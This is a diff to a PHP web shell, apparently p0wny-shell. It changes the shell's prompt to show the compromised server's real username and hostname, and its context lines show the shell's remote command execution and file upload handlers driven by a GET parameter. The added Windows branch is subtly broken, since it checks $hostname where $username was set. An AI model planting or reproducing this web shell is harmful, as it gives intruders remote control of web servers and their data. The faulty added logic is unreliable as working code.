@@ -1,5 +1,10 @@
 <?php
 
+$SHELL_CONFIG = [
+    'username' => 'p0wny',
+    'hostname' => 'shell',
+];
+
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -46,6 +51,10 @@ function executeCommand($cmd) {
         proc_close($handle);
     }
     return $output;
+}
+
+function isRunningWindows() {
+    return stripos(PHP_OS, "WIN") === 0;
 }
 
 function featureShell($cmd, $cwd) {
@@ -123,6 +132,27 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function initShellConfig() {
+    global $SHELL_CONFIG;
+
+    if (isRunningWindows()) {
+        $username = getenv('USERNAME');
+        if ($hostname !== false) {
+            $SHELL_CONFIG['username'] = $username;
+        }
+    } else {
+        $pwuid = posix_getpwuid(posix_geteuid());
+        if ($pwuid !== false) {
+            $SHELL_CONFIG['username'] = $pwuid['name'];
+        }
+    }
+
+    $hostname = gethostname();
+    if ($hostname !== false) {
+        $SHELL_CONFIG['hostname'] = $hostname;
+    }
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
@@ -148,6 +178,8 @@ if (isset($_GET["feature"])) {
     header("Content-Type: application/json");
     echo json_encode($response);
     die();
+} else {
+    initShellConfig();
 }
 
 ?><!DOCTYPE html>
@@ -299,6 +331,7 @@ if (isset($_GET["feature"])) {
         </style>
 
         <script>
+            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
@@ -424,7 +457,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
